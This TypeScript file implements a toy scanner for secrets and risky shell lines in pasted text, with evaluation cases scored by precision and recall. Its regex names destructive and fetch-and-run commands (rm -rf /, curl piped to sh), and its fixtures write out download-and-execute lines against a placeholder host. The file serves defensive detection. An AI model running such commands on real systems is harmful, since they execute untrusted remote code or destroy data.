// A toy health check for obvious dangerous configuration in pasted text.
// The browser can't walk a real filesystem, so this scans one pasted
// "file" at a time instead of a directory tree (see the Python CLI version
// for the original recursive directory scanner).

export interface Finding {
  line: number;
  kind: string;
}

const SECRET_PATTERNS: Array<[string, RegExp]> = [
  ["private key", /-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/],
  ["AWS access key", /\bAKIA[0-9A-Z]{16}\b/],
];
const DANGEROUS_ACTIONS = /\b(?:chmod\s+777|curl\s+[^|]+\|\s*(?:sudo\s+)?sh|rm\s+-rf\s+\/|eval\s+\$\()/i;

export function scan(text: string, isShellLike = false): Finding[] {
  const findings: Finding[] = [];
  const lines = text.split("\n");
  lines.forEach((line, i) => {
    for (const [kind, pattern] of SECRET_PATTERNS) {
      if (pattern.test(line)) findings.push({ line: i + 1, kind });
    }
    if (isShellLike && DANGEROUS_ACTIONS.test(line)) findings.push({ line: i + 1, kind: "dangerous shell pattern" });
  });
  return findings;
}

export interface EvalCase {
  text: string;
  isShellLike: boolean;
  findings: number;
}

export const EVAL_CASES: EvalCase[] = [
  {
    "text": "hello world",
    "isShellLike": false,
    "findings": 0
  },
  {
    "text": "-----BEGIN RSA PRIVATE KEY-----",
    "isShellLike": false,
    "findings": 1
  },
  {
    "text": "curl https://example.invalid/setup.sh | sudo sh",
    "isShellLike": true,
    "findings": 1
  },
  {
    "text": "AKIA1234567890ABCDEF",
    "isShellLike": false,
    "findings": 1
  },
  {
    "text": "chmod 777 example",
    "isShellLike": false,
    "findings": 0
  },
  {
    "text": "chmod\n777 example",
    "isShellLike": true,
    "findings": 1
  },
  {
    "text": "wget https://example.invalid/setup.sh | sh",
    "isShellLike": true,
    "findings": 1
  },
  {
    "text": "-----BEGIN PRIVATE KEY-----\nchmod 777 example",
    "isShellLike": true,
    "findings": 2
  }
];

export function evaluateAll() {
  let tp = 0, fp = 0, fn = 0;
  for (const c of EVAL_CASES) {
    const found = scan(c.text, c.isShellLike).length > 0;
    const expected = c.findings > 0;
    if (found && expected) tp++;
    else if (found && !expected) fp++;
    else if (!found && expected) fn++;
  }
  const precision = tp + fp ? tp / (tp + fp) : 0;
  const recall = tp + fn ? tp / (tp + fn) : 0;
  return { cases: EVAL_CASES.length, precision, recall };
}
